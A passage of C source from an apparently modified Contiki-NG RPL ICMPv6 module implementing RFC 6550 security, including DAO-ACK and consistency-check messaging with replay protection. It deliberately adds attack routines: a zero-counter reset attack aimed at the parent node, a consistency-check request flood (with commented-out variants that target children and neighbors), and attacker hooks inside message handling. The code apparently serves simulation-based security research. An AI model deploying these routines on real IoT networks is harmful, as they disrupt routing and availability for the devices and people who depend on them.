  buffer = UIP_ICMP_PAYLOAD;

#if RPL_SECURITY
  /* 1. Add Security Header */
  sec_len = add_security_section(RPL_TIMESTAMP_0, RPL_KIM_0,
                                 RPL_SEC_LVL, RPL_KEY_INDEX_0);
  pos += sec_len;
#endif

  buffer[pos++] = curr_instance.instance_id;

  /* Set 'D' flag if a local RPLInstanceID is used[cite: 1] */
  uint8_t flags = 0;
  if (curr_instance.instance_id & RPL_INSTANCE_LOCAL_FLAG)
  {
    flags |= RPL_DAO_D_FLAG;
  }
  buffer[pos++] = flags;

  buffer[pos++] = sequence;
  buffer[pos++] = status;

  /* Append the DODAGID if the 'D' flag is set[cite: 1] */
  if (flags & RPL_DAO_D_FLAG)
  {
    memcpy(buffer + pos, &curr_instance.dag.dag_id, 16);
    pos += 16;
  }

  LOG_INFO("sending a DAO-%s seqno %d to ",
           status < RPL_DAO_ACK_UNABLE_TO_ACCEPT ? "ACK" : "NACK", sequence);
  LOG_INFO_6ADDR(dest);
  LOG_INFO_(" with status %d\n", status);

#if RPL_SECURITY
  /* 2. Set fields, generate Nonce and Encrypt */
  set_ip_icmp_fields(dest, RPL_CODE_SEC_DAO_ACK);
  LOG_INFO("RFC6550-SEC: Encrypting outgoing DAO-ACK to ");
  LOG_INFO_6ADDR(dest);
  LOG_INFO_(" using Local Outgoing Counter(Sec_Header): %" PRIu32 "\n", rpl_sec_counter);
  set_ccm_nonce(ccm_nonce, rpl_sec_counter, RPL_SEC_LVL, RPL_KIM_0);
  /* RFC 6550: Counter must not reach 0xFFFFFFFF */
  if (rpl_sec_counter >= 0xFFFFFFFE)
  {
    LOG_ERR("RPL Security: Outgoing Counter exhausted (0xFFFFFFFF). Triggering DODAG Local Repair.\n");
    /* Counter overflow hone par naye keys ya network reset ki zaroorat hoti hai */
    rpl_local_repair("Sec Counter Exhausted");
    return; /* Packet send cancel karein */
  }
  else
  {
    rpl_sec_counter++;
  }

  mic_len = sec_aead(ccm_nonce, pos - sec_len, sec_len, RPL_SEC_LVL, RPL_ENCRYPT);
  pos += mic_len;

  uip_icmp6_send(dest, ICMP6_RPL, RPL_CODE_SEC_DAO_ACK, pos);
#else
  uip_icmp6_send(dest, ICMP6_RPL, RPL_CODE_DAO_ACK, pos);
#endif
}
#endif /* RPL_WITH_DAO_ACK */
/*---------------------------------------------------------------------------*/

#if RPL_SECURITY

/*---------------------------------------------------------------------------*/
static void cc_output(uip_ipaddr_t *addr, uint8_t type, uint16_t nonce, uint32_t dest_counter, uint8_t req_instance_id, uip_ipaddr_t *req_dag_id)
{
  unsigned char *buffer;
  int pos;
  int sec_len;
  uint8_t ccm_nonce[RPL_NONCE_LENGTH];
  uint8_t mic_len; /* n-byte MAC length */

  // LOG_INFO("sending CC Message to: ");
  // LOG_INFO_6ADDR(addr);
  // LOG_INFO_(" type: %u, nonce: %u, dest_counter: %" PRIu32 "\n", type, nonce, dest_counter);

  if (type == RPL_CC_REQUEST)
  {
    LOG_INFO("RPL CC: [TX REQUEST] to ");
    LOG_INFO_6ADDR(addr);
    LOG_INFO_(" | Payload: [Nonce=%u, Our Estimate of Peer's Counter(Destination Counter)=%" PRIu32 ", InstanceID=%u]\n",
              nonce, dest_counter, req_instance_id);
  }
  else if (type == RPL_CC_RESPONSE)
  {
    LOG_INFO("RPL CC: [TX RESPONSE] to ");
    LOG_INFO_6ADDR(addr);
    LOG_INFO_(" | Payload: [Echoed Nonce=%u, Peer's Counter Stored By Us(Stored Watermark)=%" PRIu32 ", InstanceID=%u]\n",
              nonce, dest_counter, req_instance_id);
  }

  if (addr == NULL)

  {
    LOG_ERR("CC output target address null\n");
    return;
  }

  pos = 0;
  buffer = UIP_ICMP_PAYLOAD;
  sec_len = add_security_section(RPL_TIMESTAMP_0, RPL_KIM_0, RPL_SEC_LVL, RPL_KEY_INDEX_0);

  pos += sec_len;

  /* RFC 6550 CC Base Object */
  buffer[pos++] = req_instance_id;                         /* Echo the received Instance ID[cite: 1] */
  buffer[pos++] = (type == RPL_CC_RESPONSE) ? 0x80 : 0x00; /* R flag in MSB, 7 bits reserved */

  set16(buffer, pos, nonce); /* 16-bit Nonce */
  pos += 2;

  if (req_dag_id != NULL)
  {
    memcpy(buffer + pos, req_dag_id, 16); /* Echo the received 128-bit DODAGID[cite: 1] */
  }
  else
  {
    memset(buffer + pos, 0, 16);
  }
  pos += 16;

  set32(buffer, pos, dest_counter); /* 32-bit Destination Counter */
  pos += 4;

  /* Encrypt and Send */
  set_ip_icmp_fields(addr, RPL_CODE_CC);

  LOG_INFO("RFC6550-SEC: Encrypting outgoing CC to ");
  LOG_INFO_6ADDR(addr);
  LOG_INFO_(" using Local Outgoing Counter(Sec_Header): %" PRIu32 "\n", rpl_sec_counter);
  set_ccm_nonce(ccm_nonce, rpl_sec_counter, RPL_SEC_LVL, RPL_KIM_0);
  /* RFC 6550: Counter must not reach 0xFFFFFFFF */
  if (rpl_sec_counter >= 0xFFFFFFFE)
  {
    LOG_ERR("RPL Security: Outgoing Counter exhausted (0xFFFFFFFF). Triggering DODAG Local Repair.\n");
    /* Counter overflow hone par naye keys ya network reset ki zaroorat hoti hai */
    rpl_local_repair("Sec Counter Exhausted");
    return; /* Packet send cancel karein */
  }
  else
  {
    rpl_sec_counter++;
  }

  mic_len = sec_aead(ccm_nonce, pos - sec_len, sec_len, RPL_SEC_LVL, RPL_ENCRYPT);
  pos += mic_len;

  uip_icmp6_send(addr, ICMP6_RPL, RPL_CODE_CC, pos);
}

/*---------------------------------------------------------------------------*/
static void
cc_input(void)
{
  uip_ipaddr_t from;
  unsigned char *buffer;
  uint16_t buffer_length;
  int pos;
  int sec_len;
  int len;
  uint8_t subopt_type;
  uint8_t ccm_nonce[RPL_NONCE_LENGTH];
  uint8_t mic_len; /* n-byte MAC length */

  uint8_t instance_id;
  uint32_t destination_counter;
  uint8_t type;
  uint16_t nonce;
  uip_ipaddr_t dag_id;

  uint8_t kim, lvl, key_index;
  uint32_t counter;

  uip_ipaddr_copy(&from, &UIP_IP_BUF->srcipaddr);

#if RPL_SECURITY
  rpl_remove_header();
#endif

  buffer = UIP_ICMP_PAYLOAD;
  pos = 0;

  LOG_INFO("received CC message from ");
  LOG_INFO_6ADDR(&from);
  LOG_INFO_("\n");

  /* 1. Parse Security Header Correctly */
  pos++;
  uint8_t algorithm = buffer[pos++]; // Byte 1 (Algorithm)

  kim = (buffer[pos] & RPL_KIM_MASK) >> RPL_KIM_SHIFT; // Byte 2 (KIM)
  lvl = (buffer[pos++] & RPL_LVL_MASK);                // Byte 2 (LVL)

  ++pos; // Byte 3 (Flags)

  /* Agar algorithm support nahi karte ho to drop kar sakte ho */
  if (algorithm != 0)
  {
    LOG_ERR("RPL: Unsupported Security Algorithm, discard\n");
    goto discard;
  }

  if (uip_ipaddr_cmp(&UIP_IP_BUF->srcipaddr, &UIP_IP_BUF->destipaddr))

  {
    LOG_ERR("RPL: Secure packet from myself, discard\n");
    goto discard;
  }
  /* The 'T' flag MUST be ignored if temporal checks are not supported by the node. */
  if (kim != 0 || lvl > 3)
  {
    LOG_ERR("RPL: Invalid Security parameters, discard\n");
    goto discard;
  }
  counter = get32(buffer, pos);
  pos += 4;

  if (counter == 0xFFFFFFFF) /* Changed from 0xffff */
  {
    LOG_ERR("RPL: Incoming security counter reaches maximum value, discard\n");
    goto discard;
  }

  key_index = buffer[pos++];
  LOG_INFO("RPL Security: Parsed Security Section from ");
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_(" -> Key Identifier Mode (KIM): %u, Security Level (LVL): %u, Incoming Counter: %" PRIu32 ", Key Identifier: %u\n", kim, lvl, counter, key_index);
  if (key_index != 0)

  {
    LOG_ERR("RPL: key_index = %u, only preinstalled key allowed\n", key_index);
    goto discard;
  }

  sec_len = pos;
  mic_len = get_mic_len(lvl);
  buffer_length = uip_len - uip_l3_icmp_hdr_len - sec_len - mic_len;

  /* 2. Decrypt and Verify MAC */
  set_ip_icmp_fields(NULL, RPL_CODE_CC);
  set_ccm_nonce(ccm_nonce, counter, lvl, kim);

  if (sec_aead(ccm_nonce, buffer_length, sec_len, lvl, RPL_DECRYPT) == 0)
  {
    LOG_ERR("RPL: MIC mismatch in CC message! Packet dropped.\n");
    goto discard;
  }

  /* Multicast CC messages MUST be discarded with no further processing[cite: 1]. */
  if (uip_is_addr_mcast(&UIP_IP_BUF->destipaddr))
  {
    LOG_ERR("RPL: CC multicast message, discard\n");
    goto discard;
  }

  /* 3. Parse CC Payload BEFORE replay checks to extract fields for echoing[cite: 1] */
  pos = sec_len;
  instance_id = buffer[pos++];
  if (curr_instance.used && curr_instance.instance_id != instance_id)
  {
    LOG_WARN("RPL: CC message with unknown instance %u\n", instance_id);
  }

  type = (buffer[pos] & 0x80) ? RPL_CC_RESPONSE : RPL_CC_REQUEST;
  pos += 1; /* Skip the single R-flag/Flags byte */

  nonce = get16(buffer, pos);
  pos += 2;

  memcpy(&dag_id, buffer + pos, sizeof(uip_ipaddr_t));
  pos += 16;

  destination_counter = get32(buffer, pos);
  pos += 4;

  /* Suboptions skip (PAD1, PADN) */
  for (; pos < buffer_length + sec_len; pos += len)
  {
    subopt_type = buffer[pos];
    if (subopt_type == RPL_OPTION_PAD1)
    {
      len = 1;
    }
    else
    {
      len = 2 + buffer[pos + 1];
    }
    if (len + pos > buffer_length + sec_len)
    {
      LOG_ERR("RPL: Invalid CC packet\n");
      goto discard;
    }
  }

  /* --- REPLAY PROTECTION START (SPECIFIC FOR CC_INPUT) --- */
  rpl_nbr_t *nbr = rpl_neighbor_get_from_ipaddr(&from);

  /////////////////////////////////////////////////////////////////////////////////

  //  Header Replay Check

  //////////////////////////////////////////////////////////////////////////////////
  /* CC Message par koi resynchronization initiate nahi hota (No CC_REQUEST loops) */
  if (nbr != NULL)
  {
    /* Check if the incoming counter is older or equal to the stored counter */
    if (counter <= nbr->sec_counter)
    {
      /* RFC 6550 Sec 10.7.1: CC messages with invalid counters MUST be dropped silently */

      LOG_ERR("RPL CC: Replay Violation! Peer's Header Counter(Security Header) (%" PRIu32 ") <= Stored Watermark for Peer (%" PRIu32 "). Dropping packet.\n",
              counter, nbr->sec_counter);
      goto discard;
    }
    else
    {
      /* Counter is fresh and valid */
      LOG_INFO("RPL Security: Counter validation successful. Updating Stored Watermark to %" PRIu32 ".\n", counter);
      LOG_INFO("RPL CC: Peer's Header Counter (%" PRIu32 ") > Stored Watermark for Peer (%" PRIu32 ").[Packet Header Authenticated! Updated Stored Watermark for Peer]\n", counter, nbr->sec_counter);

      nbr->sec_counter = counter;
    }
  }
  else
  {
    /* Agar neighbor pehli baar CC message ke through detect hua hai */
    LOG_INFO("RPL Security: New Neighbor detected via CC. Counter valid: %" PRIu32 ".\n", counter);
    /* Note: Aage ka payload process hone par ye neighbor automatically neighbor table me add ho jayega */
  }
  /* --- REPLAY PROTECTION END --- */

  /////////////////////////////////////////////////////////////////////////////////

  //  Payload Processing (Request & Response Handling)
  /* Consolidated CC Payload Processing */

  //////////////////////////////////////////////////////////////////////////////////

  if (type == RPL_CC_REQUEST)
  {
    LOG_INFO("RPL CC: Received CC Request from ");
    LOG_INFO_6ADDR(&from);

    LOG_INFO_(" | Payload: [Challenge Nonce=%u, Peer's Estimate of Our Counter(Destination Counter)=%" PRIu32 ", InstanceID=%u]\n",
              nonce, destination_counter, instance_id);

    /* RFC 6550: Response payload me Peer ka Stored Watermark daal kar echo karenge */
    uint32_t peer_stored_watermark = 0;
    if (nbr != NULL)
    {
      peer_stored_watermark = nbr->sec_counter;
    }
    cc_output(&from, RPL_CC_RESPONSE, nonce, peer_stored_watermark, instance_id, &dag_id);
    // LOG_INFO("RPL CC: Transmitting CC Response. Echoing CC Nonce: %u and providing Stored Watermark: %" PRIu32 "\n", nonce, peer_stored_watermark);
  }
  else if (type == RPL_CC_RESPONSE)
  {
    LOG_INFO("RPL CC: Received CC Response from ");
    LOG_INFO_6ADDR(&from);

    LOG_INFO_(" | Payload: [Echoed Nonce=%u, Peer's Stored Watermark for Us(Destination Counter)=%" PRIu32 "]\n",
              nonce, destination_counter);

    /* ========================================================= */
    /* 🌟 SCENARIO 4: LIVENESS CHECK / PING-PONG LOGIC           */
    /* ========================================================= */
    if (is_cc_request_active == 1)
    {
      LOG_INFO("😈 SCENARIO 4: CC Response Aaya! Liveness Check chal raha hai...\n");
      /* Counter update NAHI karna hai (Situation 1). Seedha client ko batao */
      cc_response_arrived = 1;

      /* App layer process ko instantly jagayein (High Priority Wake-up) */
      /* Check if process exists before polling (to prevent server/client crash) */
      if (&udp_attacker_process != NULL)
      {
        process_poll(&udp_attacker_process);
      }
    }
    /* ========================================================= */
    /* NORMAL RESYNCHRONIZATION (Situation 2) / SCENARIO 3       */
    /* ========================================================= */
    else
    {
      if (destination_counter >= rpl_sec_counter)
      {
        if (is_zero_counter_active == 1)
        {
          /* ATTACKER NODE: Sync roko aur Client ko Flag ke through batao */
          LOG_INFO("RPL CC: Handing over CC Response decision to Client App...\n");
          cc_received_watermark = destination_counter;
          cc_response_arrived_zero = 1;
          /* ⚡ NAYA ADDITION: App layer process ko instantly jagayein! */
          /* Check if process exists before polling (to prevent server/client crash) */
          if (&udp_attacker_process != NULL)
          {
            process_poll(&udp_attacker_process);
          }
        }
        else
        {
          /* NORMAL NODE LOGIC: Resynchronization (Situation 2) */
          LOG_INFO("RPL CC: Resync Action Required! Peer's Watermark for Us (%" PRIu32 ") >= Local Counter (%" PRIu32 "). Resynchronizing Local Counter to %" PRIu32 ".\n",
                   destination_counter, rpl_sec_counter, destination_counter + 1);
          rpl_sec_counter = destination_counter + 1; // Increment by 1
        }
      }
      else
      {
        LOG_INFO("RPL CC: In-Sync! Peer's Watermark for Us (%" PRIu32 ") < Local Counter (%" PRIu32 "). Local node is already ahead, no resync needed.\n",
                 destination_counter, rpl_sec_counter);
      }
    }
  }

discard:
  uipbuf_clear();
}

#if RPL_SECURITY

void zero_counter_attack(void)
{
  is_zero_counter_active = 1;
  printf("[ATTACK] Scenario 3 fired at %lu seconds\n",
         clock_time() / CLOCK_SECOND);
  LOG_INFO("RFC6550-SEC: SCENARIO-3 ATTACK -> Resetting Counter to 0!\n");
  rpl_sec_counter = 0;

  /* Preferred parent ka IP address nikalna */
  if (curr_instance.used && curr_instance.dag.preferred_parent != NULL)
  {
    uip_ipaddr_t *parent_ipaddr = rpl_neighbor_get_ipaddr(curr_instance.dag.preferred_parent);

    if (parent_ipaddr != NULL)
    {
      LOG_INFO("Targeting Specific Parent: ");
      LOG_INFO_6ADDR(parent_ipaddr);
      LOG_INFO_("\n");
      LOG_INFO_(" Parent (Decimal Node ID: %u)\n", parent_ipaddr->u8[15]);

      /* NULL ki jagah parent ka IP bhejenge, toh yeh Unicast Attack ban jayega! */
      rpl_icmp6_dis_output(parent_ipaddr);
      return;
    }
  }

  // LOG_INFO("Targeting ALL Neighbors (Broadcasting Multicast DIS)...\n");
  // rpl_icmp6_dis_output(NULL);
}

/* Client isko call karega jab usko normal re-sync hona hoga */
void attacker_accept_resync(uint32_t watermark)
{
  rpl_sec_counter = watermark + 1;
  LOG_INFO("RFC6550-SEC: Client accepted resync. Counter updated to %" PRIu32 "\n", rpl_sec_counter);
}

void cc_request_attack(void)
{
  is_cc_request_active = 1;
  printf("[ATTACK] Scenario 4 fired at %lu seconds\n",
         clock_time() / CLOCK_SECOND);
  LOG_INFO("RFC6550-SEC: SCENARIO-4 ATTACK -> Flooding CC REQUESTs!\n");
  uint16_t random_nonce;

  /* ================================================================= */
  /* CASE 1: Child attacking Parent (Upward DoS Attack)                */
  /* ================================================================= */

  if (curr_instance.used && curr_instance.dag.preferred_parent != NULL)
  {
    uip_ipaddr_t *parent_ipaddr = rpl_neighbor_get_ipaddr(curr_instance.dag.preferred_parent);

    if (parent_ipaddr != NULL)
    {
      LOG_INFO("Targeting Parent for CC Flood: ");
      LOG_INFO_6ADDR(parent_ipaddr);
      LOG_INFO_("\n");
      LOG_INFO_(" Parent (Decimal Node ID: %u)\n", parent_ipaddr->u8[15]);

      random_nonce = random_rand();
      /* RFC 6550: Request payload me target node ka humare paas stored watermark estimate jayega */
      uint32_t dest_counter_estimate = 0;
      rpl_nbr_t *nbr = rpl_neighbor_get_from_ipaddr(parent_ipaddr);
      if (nbr != NULL)
      {
        dest_counter_estimate = nbr->sec_counter;
      }

      cc_output(parent_ipaddr, RPL_CC_REQUEST, random_nonce, dest_counter_estimate,
                curr_instance.instance_id, &curr_instance.dag.dag_id);
    }
  }

  /* ================================================================= */
  /* CASE 2: Attacking both Parents and Children/Neighbors (Bi-directional) */
  /* ================================================================= */

  // rpl_nbr_t *nbr_all = nbr_table_head(rpl_neighbors);
  // while (nbr_all != NULL)
  // {
  //   uip_ipaddr_t *target_ipaddr = rpl_neighbor_get_ipaddr(nbr_all);
  //   if (target_ipaddr != NULL)
  //   {
  //     LOG_INFO("Targeting Child/Neighbor for CC Flood: ");
  //     LOG_INFO_6ADDR(target_ipaddr);
  //     LOG_INFO_("\n");
  //  LOG_INFO_(" Child/Neighbor (Decimal Node ID: %u)\n", target_ipaddr->u8[15]);

  //     random_nonce = random_rand();
  //     /* RFC 6550: Request payload me target node ka humare paas stored watermark estimate jayega */
  //     uint32_t dest_counter_estimate = 0;
  //     rpl_nbr_t *nbr = rpl_neighbor_get_from_ipaddr(target_ipaddr);
  //     if (nbr != NULL)
  //     {
  //       dest_counter_estimate = nbr->sec_counter;
  //     }

  //     cc_output(target_ipaddr, RPL_CC_REQUEST, random_nonce, dest_counter_estimate,
  //               curr_instance.instance_id, &curr_instance.dag.dag_id);
  //   }
  //   nbr_all = nbr_table_next(rpl_neighbors, nbr_all);
  // }

  /* ================================================================= */
  /* CASE 2(a): Only attacking Children (Skipping Parent - Downward)   */
  /* ================================================================= */

  // rpl_nbr_t *nbr = nbr_table_head(rpl_neighbors);
  // uip_ipaddr_t *parent_ipaddr = NULL;

  // /* 1. Apne Parent ka IP address pata karein (taki usko bacha sakein) */
  // if (curr_instance.used && curr_instance.dag.preferred_parent != NULL)
  // {
  //   parent_ipaddr = rpl_neighbor_get_ipaddr(curr_instance.dag.preferred_parent);
  // }

  // /* 2. Sabhi neighbors (table) ko ek-ek karke check karein */
  // while (nbr != NULL)
  // {
  //   uip_ipaddr_t *child_ipaddr = rpl_neighbor_get_ipaddr(nbr);

  //   if (child_ipaddr != NULL)
  //   {
  //     /* 3. Check karein ki current neighbor hamara Parent toh nahi hai */
  //     if (parent_ipaddr != NULL && uip_ip6addr_cmp(child_ipaddr, parent_ipaddr))
  //     {

  //       /* --- YAHAN NAYA LOG ADD KIYA GAYA HAI --- */
  //       if (parent_ipaddr != NULL)
  //       {
  //         LOG_INFO("Attacker ka Parent hai (Is par attack nahi hoga): ");
  //         LOG_INFO_6ADDR(parent_ipaddr);
  //         LOG_INFO_("\n");
  //       }

  //       /* Agar IP same hai, toh yeh Parent hai. Isko skip karein. */
  //       LOG_INFO("Skipping Parent: ");
  //       LOG_INFO_6ADDR(child_ipaddr);
  //       LOG_INFO_("\n");

  //       /* Loop aage badhayein bina attack kiye */
  //       nbr = nbr_table_next(rpl_neighbors, nbr);
  //       continue;
  //     }

  //     //     /* 4. Yahan sirf Children bachenge, in par Downward Attack fire karein */
  //     LOG_INFO("Targeting Child for CC Flood: ");
  //     LOG_INFO_6ADDR(child_ipaddr);
  //     LOG_INFO_("\n");

  //     LOG_INFO_(" Child (Decimal Node ID: %u)\n", child_ipaddr->u8[15]);

  //     //     /* Fire a CC Request to the Child */

  //     random_nonce = random_rand();
  //     /* RFC 6550: Request payload me target node ka humare paas stored watermark estimate jayega */
  //     uint32_t dest_counter_estimate = 0;
  //     rpl_nbr_t *nbr = rpl_neighbor_get_from_ipaddr(child_ipaddr);
  //     if (nbr != NULL)
  //     {
  //       dest_counter_estimate = nbr->sec_counter;
  //     }

  //     cc_output(child_ipaddr, RPL_CC_REQUEST, random_nonce, dest_counter_estimate,
  //               curr_instance.instance_id, &curr_instance.dag.dag_id);
  //   }

  //   /* Agle neighbor par jao */
  //   nbr = nbr_table_next(rpl_neighbors, nbr);
  // }
}
#endif
/* ------------------------------------------------------------------------- */

#endif /* RPL_SECURITY */

void rpl_icmp6_init()
{
  uip_icmp6_register_input_handler(&dis_handler);
  uip_icmp6_register_input_handler(&dio_handler);
  uip_icmp6_register_input_handler(&dao_handler);

#if RPL_WITH_DAO_ACK
  uip_icmp6_register_input_handler(&dao_ack_handler);
#endif /* RPL_WITH_DAO_ACK */
#if RPL_SECURITY
  /* CC handler ko register karna zaroori hai taaki CC messages receive ho sakein */
  uip_icmp6_register_input_handler(&cc_handler);

  /* Initial state set karna */
  rpl_last_dis.responded = RPL_DIS_RESPONDED;
#endif /* RPL_SECURITY */
}
/*---------------------------------------------------------------------------*/

/** @}*/